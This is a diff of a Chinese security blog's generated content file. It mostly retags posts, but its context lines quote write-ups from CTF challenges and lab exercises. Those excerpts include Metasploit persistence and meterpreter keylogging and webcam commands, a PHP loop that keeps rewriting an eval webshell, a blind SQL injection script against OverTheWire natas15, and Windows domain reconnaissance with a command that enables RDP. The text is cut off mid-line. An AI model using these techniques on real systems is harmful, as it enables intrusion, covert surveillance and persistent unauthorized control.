@@ -15,6 +15,12 @@
 <h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>尽快升级安装微软补丁，<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464" target="_blank" rel="external">链接</a></p>
 ]]></content>
       
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -39,10 +45,16 @@
 <h2 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h2><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">run persistence -U -<span class="selector-tag">i</span> <span class="number">5</span> -r 攻击机ip -<span class="selector-tag">p</span> 反弹端口</div><div class="line">-U 用户登录时反弹会话也可以-X当系统启动时反弹会话</div><div class="line">-<span class="selector-tag">i</span> 时间</div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> 渗透测试 </tag>
+            <tag> MSF </tag>
             
         </tags>
         
@@ -63,6 +75,12 @@
 </ul>
 ]]></content>
       
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -87,6 +105,12 @@
 <h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载最新的Samba版本手动更新</p>
 ]]></content>
       
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -105,10 +129,14 @@
 <p>Python的图像处理库还是很强大的</p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> Pyhon </tag>
             
@@ -125,10 +153,16 @@
 <h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>最开始一直使用的<code>reGeorg+Proxifier</code>在有web服务的时候可以进行内网代理，但是后来在遇到深层内网时，往往不存在web服务，就接触到了<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">sSocks</a></p>
 <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ipconfig /all</div><div class="line">netstat –an</div><div class="line">net <span class="literal">start</span></div><div class="line">net <span class="keyword">user</span></div><div class="line"><span class="title">net</span> <span class="keyword">user</span> <span class="title">/domain</span></div><div class="line">net <span class="keyword">group</span> <span class="title">“domain</span> admins”        <span class="comment">#查看域管理员</span></div><div class="line">net localgroup administrators</div><div class="line">net view /domain</div><div class="line">dsquery server         <span class="comment">#查看域控服务器</span></div><div class="line">dsquery subnet        <span class="comment">#查看域IP范围</span></div><div class="line">query <span class="keyword">user</span>           <span class="title">#查看有多少用户在登录</span></div><div class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t reg_dword /d <span class="number">0</span> /f 开启<span class="number">3389</span>远程终端</div></pre></td></tr></table></figure>]]></content>
       
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> 渗透测试 </tag>
+            <tag> 内网 </tag>
             
         </tags>
         
@@ -143,6 +177,12 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为跟朋友有约定说要拿到一等奖，最后也没实现，自己也需要进一步的完善自己，努力去达成这个约定。<code>The dream is to be realized.</code></p>
 ]]></content>
       
+        <categories>
+            
+            <category> 总结 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -161,10 +201,16 @@
 <p>如果攻击成功一般会返回一个meterpreter：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ps <span class="comment">#列出当前系统进程</span></div><div class="line">Kill uid <span class="comment">#消灭指定uid系统进程</span></div><div class="line">keyscan_start <span class="comment">#开始键盘记录软件</span></div><div class="line">webcam_snap <span class="comment">#拍照</span></div><div class="line"><span class="keyword">screenshot </span><span class="comment">#截屏</span></div><div class="line"><span class="keyword">shell </span><span class="comment">#返回一个shell</span></div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> 渗透测试 </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> 渗透测试 </tag>
+            <tag> MSF </tag>
             
         </tags>
         
@@ -180,6 +226,12 @@
 <h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="number">1</span>);</div><div class="line">    unlink(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line"></div><div class="line">        file_put_contents(<span class="string">'upload/config.php'</span>,<span class="string">'&lt;?php @eval($_POST["Isron"]);?&gt;'</span>);</div><div class="line">   </div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -206,14 +258,16 @@
 </ul>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
             <tag> 命令执行 </tag>
-            
-            <tag> Linux </tag>
-            
-            <tag> CTF </tag>
             
         </tags>
         
@@ -228,6 +282,12 @@
 <p>limit 与 offset：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="section">mysql&gt; select * from users limit 1,1;</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">| id | username | password   |</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">|  2 | Angelina | I-kill-you |</span></div><div class="line">+----+----------+------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql默认从第0个开始所以取第二位，第二个参数是取一个</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  1 | Dumb     | Dumb     |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">只取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  3 | Dummy    | p@ssword |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">从第三个开始取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 2 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line"><span class="section">|  4 | secure   | crappy   |</span></div><div class="line">+----+----------+----------+</div><div class="line">2 rows in set (0.00 sec)</div><div class="line">从第三个开始取两位</div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -254,10 +314,16 @@
 <h2 id="natas15"><a href="#natas15" class="headerlink" title="natas15"></a>natas15</h2><p>URL:<code>http://natas15.natas.labs.overthewire.org/</code><br>Username:natas15<br>Password:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br>明显的盲注，先利用requests库的<code>requests.auth.HTTPBasicAuth</code>通过认证，盲注脚本：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from requests<span class="selector-class">.auth</span> import HTTPBasicAuth</div><div class="line">url=<span class="string">'http://natas15.natas.labs.overthewire.org/index.php'</span></div><div class="line">username = <span class="string">'natas15'</span></div><div class="line">password = <span class="string">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span></div><div class="line">base = <span class="string">'0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></div><div class="line">passd = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> <span class="selector-tag">b</span> <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</div><div class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> base:</div><div class="line">        c = ord(i)</div><div class="line">        payload=&#123;<span class="string">'username'</span>:<span class="string">'natas16\" and ascii(mid(password,'</span>+str(b)+<span class="string">',1))='</span>+str(c)+<span class="string">'#'</span>&#125;</div><div class="line">        <span class="selector-id">#print</span> payload</div><div class="line">        a=requests.post(url,auth=requests<span class="selector-class">.auth</span><span class="selector-class">.HTTPBasicAuth</span>(username,password),data=payload)</div><div class="line">        <span class="keyword">if</span> <span class="string">'This user exists.'</span> <span class="keyword">in</span> <span class="selector-tag">a</span><span class="selector-class">.content</span>:</div><div class="line">            passd += <span class="selector-tag">i</span></div><div class="line">            print passd</div><div class="line">            break</div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -295,6 +361,12 @@
 </ol>
 ]]></content>
       
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -320,12 +392,16 @@
 <h3 id="cdggjydcnfsdyjaq"><a href="#cdggjydcnfsdyjaq" class="headerlink" title="cdggjydcnfsdyjaq"></a>cdggjydcnfsdyjaq</h3><p>MD5碰撞，线上赛有提及，0e+任意数字双等于0e+任意数字</p>
 ]]></content>
       
+        <categories>
+            
+            <category> 代码审计 </category>
+            
+        </categories>
+        
         
         <tags>
             
             <tag> PHP </tag>
-            
-            <tag> 代码审计 </tag>
             
         </tags>
         
@@ -458,6 +534,12 @@
 <h2 id="Bypass-Csp"><a href="#Bypass-Csp" class="headerlink" title="Bypass_Csp"></a>Bypass_Csp</h2><p>一种安全策略的出生，避免不了怎么想着去Bypass</p>
 ]]></content>
       
+        <categories>
+            
+            <category> Web安全 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -476,10 +558,14 @@
 <p>还以为是当初那个利用数组绕过弱等的题目，然后发现<code>name</code>跟<code>password</code>各有一个<code>string</code>限制，而且是<code>===</code>强等于,Google了一下发现一篇<a href="https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md" target="_blank" rel="external">文章</a>对两篇PDF加密可以获得同样的SHA1值,还是挺有意思的，附上代码：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import requests</div><div class="line"></div><div class="line"># this is copy/paste from Hex editor - two different files with the same SHA1 checksum</div><div class="line">name = '<span class="number">255044462</span>D312E33 <span class="number">0A25E2E3</span> CFD30A0A <span class="number">0A312030</span> <span class="number">206</span>F626A <span class="number">0</span>A3C3C2F <span class="number">57696474</span> <span class="number">68203220</span> <span class="number">3020522</span>F <span class="number">48656967</span> <span class="number">68742033</span> <span class="number">20302052</span> <span class="number">2F547970</span> <span class="number">65203420</span> <span class="number">3020522</span>F <span class="number">53756274</span> <span class="number">79706520</span> <span class="number">35203020</span> <span class="number">522F4669</span> <span class="number">6C746572</span> <span class="number">20362030</span> <span class="number">20522F43</span> <span class="number">6F6C6F72</span> <span class="number">53706163</span> <span class="number">65203720</span> <span class="number">3020522</span>F <span class="number">4C656E67</span> <span class="number">74682038</span> <span class="number">20302052</span> <span class="number">2F426974</span> <span class="number">73506572</span> <span class="number">436F6D70</span> <span class="number">6</span>F6E656E <span class="number">7420383</span>E <span class="number">3E0A7374</span> <span class="number">7265616</span>D <span class="number">0</span>AFFD8FF FE0024<span class="number">53 48412D31</span> <span class="number">20697320</span> <span class="number">64656164</span> <span class="number">21212121</span> <span class="number">21852</span>FEC <span class="number">09233975</span> <span class="number">9C39B1A1</span> C63C4C97 E1FFFE01 <span class="number">7</span>F46DC93 A6B67E01 <span class="number">3</span>B029AAA <span class="number">1</span>DB2560B <span class="number">45</span>CA67D6 <span class="number">88</span>C7F84B <span class="number">8</span>C4C791F E02B3DF6 <span class="number">14</span>F86DB1 <span class="number">690901C5</span> <span class="number">6B45C153</span> <span class="number">0</span>AFEDFB7 <span class="number">6038E972</span> <span class="number">722</span>FE7AD <span class="number">728F0E49</span> <span class="number">04E046C2</span> <span class="number">30570</span>FE9 D41398AB E12EF5BC <span class="number">942</span>BE335 <span class="number">42</span>A4802D <span class="number">98</span>B5D70F <span class="number">2</span>A332EC3 <span class="number">7</span>FAC3514 E74DDC0F <span class="number">2</span>CC1A874 CD0C78<span class="number">30 5A215664</span> <span class="number">61309789</span> <span class="number">606</span>BD0BF <span class="number">3</span>F98CDA8 <span class="number">044629A1</span> <span class="number">3</span>C68746D <span class="number">6</span>C3E0A3C <span class="number">73637269</span> <span class="number">7074206</span>C <span class="number">616E6775</span> <span class="number">6167653</span>D <span class="number">6A617661</span> <span class="number">73637269</span> <span class="number">70742074</span> <span class="number">7970653</span>D <span class="number">22746578</span> <span class="number">742F6A61</span> <span class="number">76617363</span> <span class="number">72697074</span> <span class="number">223</span>E0A3C <span class="number">212D2D20</span> <span class="number">40617277</span> <span class="number">202</span>D2D3E <span class="number">0A0A7661</span> <span class="number">72206820</span> <span class="number">3</span>D20646F <span class="number">63756D65</span> <span class="number">6E742E67</span> <span class="number">6574456</span>C <span class="number">656</span>D656E <span class="number">74734279</span> <span class="number">5461674</span>E <span class="number">616D6528</span> <span class="number">2248544</span>D <span class="number">4</span>C22295B <span class="number">305D2E69</span> <span class="number">6E6E6572</span> <span class="number">48544</span>D4C <span class="number">2E636861</span> <span class="number">72436F64</span> <span class="number">65417428</span> <span class="number">31303229</span> <span class="number">2E746F53</span> <span class="number">7472696</span>E <span class="number">67283136</span> <span class="number">293B0A69</span> <span class="number">66202868</span> <span class="number">203D3D20</span> <span class="number">27373327</span> <span class="number">29207</span>B0A <span class="number">20202020</span> <span class="number">646F6375</span> <span class="number">6D656E74</span> <span class="number">2E626F64</span> <span class="number">792</span>E696E <span class="number">6E657248</span> <span class="number">544D4C20</span> <span class="number">3</span>D20223C <span class="number">5354594</span>C <span class="number">453</span>E626F <span class="number">64797B62</span> <span class="number">61636B67</span> <span class="number">726</span>F756E <span class="number">642</span>D636F <span class="number">6</span>C6F723A <span class="number">5245443</span>B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">383</span>B3C2F <span class="number">48313E22</span> <span class="number">3B0A7D20</span> <span class="number">656C7365</span> <span class="number">207B0A20</span> <span class="number">20202064</span> <span class="number">6</span>F63756D <span class="number">656</span>E742E <span class="number">626F6479</span> <span class="number">2</span>E696E6E <span class="number">65724854</span> <span class="number">4</span>D4C203D <span class="number">20223C53</span> <span class="number">54594C45</span> <span class="number">3E626F64</span> <span class="number">797B6261</span> <span class="number">636B6772</span> <span class="number">6F756E64</span> <span class="number">2</span>D636F6C <span class="number">6F723A42</span> <span class="number">4</span>C55453B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">393</span>B3C2F <span class="number">48313E22</span> <span class="number">3</span>B0A7D0A <span class="number">0A3C2F73</span> <span class="number">63726970</span> <span class="number">743</span>E0A0A'</div><div class="line"></div><div class="line">password = '<span class="number">25504446</span> <span class="number">2D312E33</span> <span class="number">0A25E2E3</span> CFD30A0A <span class="number">0A312030</span> <span class="number">206</span>F626A <span class="number">0</span>A3C3C2F <span class="number">57696474</span> <span class="number">68203220</span> <span class="number">3020522</span>F <span class="number">48656967</span> <span class="number">68742033</span> <span class="number">20302052</span> <span class="number">2F547970</span> <span class="number">65203420</span> <span class="number">3020522</span>F <span class="number">53756274</span> <span class="number">79706520</span> <span class="number">35203020</span> <span class="number">522F4669</span> <span class="number">6C746572</span> <span class="number">20362030</span> <span class="number">20522F43</span> <span class="number">6F6C6F72</span> <span class="number">53706163</span> <span class="number">65203720</span> <span class="number">3020522</span>F <span class="number">4C656E67</span> <span class="number">74682038</span> <span class="number">20302052</span> <span class="number">2F426974</span> <span class="number">73506572</span> <span class="number">436F6D70</span> <span class="number">6</span>F6E656E <span class="number">7420383</span>E <span class="number">3E0A7374</span> <span class="number">7265616</span>D <span class="number">0</span>AFFD8FF FE0024<span class="number">53 48412D31</span> <span class="number">20697320</span> <span class="number">64656164</span> <span class="number">21212121</span> <span class="number">21852</span>FEC <span class="number">09233975</span> <span class="number">9C39B1A1</span> C63C4C97 E1FFFE01 <span class="number">7346</span>DC<span class="number">91 66B67E11</span> <span class="number">8</span>F029AB6 <span class="number">21</span>B2560F F9CA67CC A8C7F85B A84C7903 <span class="number">0</span>C2B3DE2 <span class="number">18</span>F86DB3 <span class="keyword">A</span><span class="number">90901D5</span> DF45C14F <span class="number">26</span>FEDFB3 DC38E96A C22FE7BD <span class="number">728F0E45</span> BCE046D2 <span class="number">3</span>C570FEB <span class="number">141398</span>BB <span class="number">552</span>EF5A0 A82BE331 FEA48037 B8B5D71F <span class="number">0</span>E332EDF <span class="number">93</span>AC3500 EB4DDC0D ECC1A864 <span class="number">790</span>C782C <span class="number">76215660</span> DD309791 D06BD0AF <span class="number">3</span>F98CDA4 BC4629B1 <span class="number">3</span>C68746D <span class="number">6</span>C3E0A3C <span class="number">73637269</span> <span class="number">7074206</span>C <span class="number">616E6775</span> <span class="number">6167653</span>D <span class="number">6A617661</span> <span class="number">73637269</span> <span class="number">70742074</span> <span class="number">7970653</span>D <span class="number">22746578</span> <span class="number">742F6A61</span> <span class="number">76617363</span> <span class="number">72697074</span> <span class="number">223</span>E0A3C <span class="number">212D2D20</span> <span class="number">40617277</span> <span class="number">202</span>D2D3E <span class="number">0A0A7661</span> <span class="number">72206820</span> <span class="number">3</span>D20646F <span class="number">63756D65</span> <span class="number">6E742E67</span> <span class="number">6574456</span>C <span class="number">656</span>D656E <span class="number">74734279</span> <span class="number">5461674</span>E <span class="number">616D6528</span> <span class="number">2248544</span>D <span class="number">4</span>C22295B <span class="number">305D2E69</span> <span class="number">6E6E6572</span> <span class="number">48544</span>D4C <span class="number">2E636861</span> <span class="number">72436F64</span> <span class="number">65417428</span> <span class="number">31303229</span> <span class="number">2E746F53</span> <span class="number">7472696</span>E <span class="number">67283136</span> <span class="number">293B0A69</span> <span class="number">66202868</span> <span class="number">203D3D20</span> <span class="number">27373327</span> <span class="number">29207</span>B0A <span class="number">20202020</span> <span class="number">646F6375</span> <span class="number">6D656E74</span> <span class="number">2E626F64</span> <span class="number">792</span>E696E <span class="number">6E657248</span> <span class="number">544D4C20</span> <span class="number">3</span>D20223C <span class="number">5354594</span>C <span class="number">453</span>E626F <span class="number">64797B62</span> <span class="number">61636B67</span> <span class="number">726</span>F756E <span class="number">642</span>D636F <span class="number">6</span>C6F723A <span class="number">5245443</span>B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">383</span>B3C2F <span class="number">48313E22</span> <span class="number">3B0A7D20</span> <span class="number">656C7365</span> <span class="number">207B0A20</span> <span class="number">20202064</span> <span class="number">6</span>F63756D <span class="number">656</span>E742E <span class="number">626F6479</span> <span class="number">2</span>E696E6E <span class="number">65724854</span> <span class="number">4</span>D4C203D <span class="number">20223C53</span> <span class="number">54594C45</span> <span class="number">3E626F64</span> <span class="number">797B6261</span> <span class="number">636B6772</span> <span class="number">6F756E64</span> <span class="number">2</span>D636F6C <span class="number">6F723A42</span> <span class="number">4</span>C55453B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">393</span>B3C2F <span class="number">48313E22</span> <span class="number">3</span>B0A7D0A <span class="number">0A3C2F73</span> <span class="number">63726970</span> <span class="number">743</span>E0A0A'</div><div class="line"></div><div class="line">print '[+] create URL decoded strings to send as GET parameters [name] and [password]...'</div><div class="line">name = ''.join(name.split(' '))</div><div class="line">password = ''.join(password.split(' '))</div><div class="line"></div><div class="line">namestr = ''.join(['%' + name[i] + name[i + <span class="number">1</span>]</div><div class="line">           for i in range(<span class="number">0</span>, len(name)) if i % <span class="number">2</span> == <span class="number">0</span>])</div><div class="line"></div><div class="line">passwordstr = ''.join(['%' + password[j] + password[j + <span class="number">1</span>]</div><div class="line">           for j in range(<span class="number">0</span>, len(password)) if j % <span class="number">2</span> == <span class="number">0</span>])</div><div class="line"></div><div class="line">print '[+] sending request to http://<span class="number">127.0.0.1</span>/upload/test.php/?name=[name]&amp;password=[password]'</div><div class="line"></div><div class="line">u = 'http://<span class="number">127.0.0.1</span>/upload/test.php/?name=&#123;&#125;&amp;password=&#123;&#125;'.format(namestr, passwordstr)</div><div class="line"></div><div class="line">resp = requests.get(u, headers=&#123;</div><div class="line">    'Host': '<span class="number">127.0.0.1</span>'</div><div class="line">&#125;)</div><div class="line"></div><div class="line">print '[+] read FLAG from response...\n\n'</div><div class="line">print resp.content</div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> SHA1 </tag>
             
@@ -497,10 +583,16 @@
 <h2 id="；"><a href="#；" class="headerlink" title="；"></a>；</h2><p>;命令不管怎么样都会执行后面的命令但是跟&amp;有点不同。<br>栗子：<br><img src="http://p1.bpimg.com/567571/fe9c1f57b8dd41fd.png" alt=""><br>执行cd Desktop 且执行 ls 并且 ls 是在Desktop目录下执行的，而&amp;是不会改变当前目录<br><img src="http://i1.piimg.com/567571/2b164c6dc3e2d9b0.png" alt=""><br>由于没有dasd目录但是ls还是会执行，且在当前目录下</p>
 ]]></content>
       
+        <categories>
+            
+            <category> Linux </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> Linux </tag>
+            <tag> Linux命令 </tag>
             
         </tags>
         
@@ -552,10 +644,16 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 <p>解密flag：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">g=<span class="keyword">open</span>(<span class="string">'flag.txt'</span>,<span class="string">'rb'</span>).read()</div><div class="line">key=<span class="string">'OKIWILLLETYOUKNOWWHATTHEKEYIS'</span></div><div class="line">c = <span class="string">''</span></div><div class="line">t = <span class="keyword">chr</span>(<span class="number">0</span>)</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">x</span>=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> p in g:</div><div class="line">    c = <span class="keyword">chr</span>(<span class="keyword">ord</span>(p)+<span class="keyword">ord</span>(t) - i*i - (<span class="keyword">ord</span>(key[i % len(key)]) ^ <span class="keyword">ord</span>(t)) &amp; <span class="number">0xff</span>)</div><div class="line">    t = c</div><div class="line">    i += <span class="number">1</span></div><div class="line">    <span class="keyword">x</span>+=c</div><div class="line"><span class="keyword">print</span> <span class="keyword">x</span></div></pre></td></tr></table></figure></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -569,10 +667,14 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 <p>第一次接触js代码跟XXE漏洞，之后好好研究研究</p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> XXE </tag>
             
@@ -587,10 +689,16 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">pic_url = []  <span class="comment"># 创建一个列表用于存储图片的URL</span></div><div class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range( <span class="number">84</span>, <span class="number">93</span> ):  <span class="comment"># 一个URL一张大图，多次访问</span></div><div class="line">    url = <span class="string">"http://desk.zol.com.cn/bizhi/6849_854"</span> + str( q ) + <span class="string">"_2.html"</span></div><div class="line">    head = &#123;</div><div class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>&#125;</div><div class="line">    ss = requests.get( url, headers=head )  <span class="comment"># GET方式请求访问</span></div><div class="line">    s = re.findall( <span class="string">'&lt;img id="bigImg" src="(.*?)"'</span>, ss.content )  <span class="comment"># 通过正则表达式匹配图片URL</span></div><div class="line">    s = s[<span class="number">0</span>]</div><div class="line">    pic_url.append( s )</div><div class="line"><span class="keyword">print</span> pic_url</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    os.mkdir( <span class="string">"your_name"</span> )  <span class="comment">#创建一个文件夹</span></div><div class="line">    os.chdir( <span class="string">"your_name"</span> )  <span class="comment">#将工作目录转移到创建的文件夹当中</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line">    os.chdir( <span class="string">"your_name"</span> )</div><div class="line"><span class="keyword">for</span> each <span class="keyword">in</span> pic_url:  <span class="comment">#for循环访问URL</span></div><div class="line">    b = random.randint( <span class="number">1</span>, <span class="number">999999</span> )  <span 